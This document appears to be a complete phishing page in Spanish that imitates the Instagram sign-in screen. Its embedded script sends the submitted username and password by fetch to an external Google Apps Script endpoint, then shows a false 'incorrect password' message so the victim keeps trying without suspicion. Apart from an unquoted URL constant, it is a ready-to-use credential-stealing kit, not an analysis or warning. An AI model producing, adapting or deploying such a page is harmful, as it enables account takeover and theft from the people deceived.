<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión · Instagram</title>
    <style>
        body {
            background-color: #000000;
            color: #e0e0e0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            width: 350px;
            padding: 40px;
            border: 1px solid #333;
            border-radius: 2px;
            text-align: center;
        }
        h1 { font-size: 24px; font-weight: 300; margin-bottom: 20px; color: #fff; }
        .input-group { margin-bottom: 15px; text-align: left; }
        input {
            width: 100%; padding: 12px; background-color: #121212; border: 1px solid #444;
            border-radius: 3px; color: #fff; box-sizing: border-box; font-size: 14px;
        }
        input::placeholder { color: #666; }
        input:focus { border-color: #888; outline: none; }
        button {
            width: 100%; padding: 12px; background-color: #0095f6; border: none;
            border-radius: 4px; color: #fff; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 10px;
        }
        button:hover { background-color: #0084d4; }
        button:disabled { background-color: #333; cursor: not-allowed; }
        .error { color: #ff6b6b; font-size: 12px; margin-top: 10px; min-height: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Iniciar sesión</h1>
        <form id="loginForm">
            <div class="input-group">
                <input type="text" name="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Contraseña" required>
            </div>
            <button type="submit" id="btn">Iniciar sesión</button>
        </form>
        <div class="error" id="errorMsg"></div>
    </div>

    <script>
        // https://script.google.com/macros/s/AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP/exec
        const SCRIPT_URL = https://script.google.com/macros/s/AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP/exec;

        const form = document.getElementById('loginForm');
        const btn = document.getElementById('btn');
        const errorMsg = document.getElementById('errorMsg');

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            btn.disabled = true;
            btn.innerText = '...';
            errorMsg.innerText = '';

            // Usamos 'no-cors' para evitar errores de bloqueo si el script de Google es antiguo
            fetch(SCRIPT_URL, {
                method: 'POST',
                body: new FormData(form),
                mode: 'no-cors' 
            })
            .then(() => {
                setTimeout(() => {
                    errorMsg.innerText = "El nombre de usuario o la contraseña es incorrecta.";
                    btn.disabled = false;
                    btn.innerText = 'Iniciar sesión';
                }, 800);
            })
            .catch(() => {
                errorMsg.innerText = "Error de conexión.";
                btn.disabled = false;
                btn.innerText = 'Iniciar sesión';
            });
        });
    </script>
</body>
</html>
